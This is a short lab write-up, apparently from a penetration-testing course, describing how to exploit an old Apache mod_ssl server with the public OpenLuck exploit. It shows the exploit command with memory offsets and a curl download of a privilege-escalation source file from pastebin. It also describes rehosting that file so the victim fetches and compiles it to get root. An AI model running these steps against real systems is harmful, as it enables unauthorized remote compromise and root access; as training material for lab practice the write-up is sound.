## Exploiting mod_ssl

From the vuln reasearch in chapter 05-06 we found:
https://github.com/heltonWernik/OpenLuck

Download and compile OpenLuck as described in the git repo.
When we run the compiled executable we get the following usage output:
![[Pasted image 20240306081031.png]]

From Nmap scan:
`443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4`

Therefore we are gonna use the offset 0x6a:
![[Pasted image 20240306081226.png]]

Exploit:
```bash
./OpenFuck 0x6a 10.0.0.10
```

The exploit with 0x6a didn't work, but the one with 0x6b did. We got a shell as the user *apache*:
![[Pasted image 20240306081555.png]]

From the output we can see that the exploit couldn't reach out to the host **pastebin.com**.
It would load the following exploit code, which would escalate the privileges and give us a root shell.
![[Pasted image 20240306082110.png]]

Since the box we attack doesn't have internet connection, we need to host this exploit ourself, change the exploit source code and recompile it.

Download the file:
```bash
curl https://pastebin.com/raw/C7v25Xr9 -o privesc.c
```
And serve it via http:
![[Pasted image 20240306082450.png]]

In the exploit we change the following line:
![[Pasted image 20240306082740.png]]
Afterwards recompile the binary.

We can see that the exploit on the victim machine pulls the privesc.c file:
![[Pasted image 20240306082843.png]]

And... we got us a root shell :)
![[Pasted image 20240306082947.png]]
(Btw the arg `-c 40` is not needed)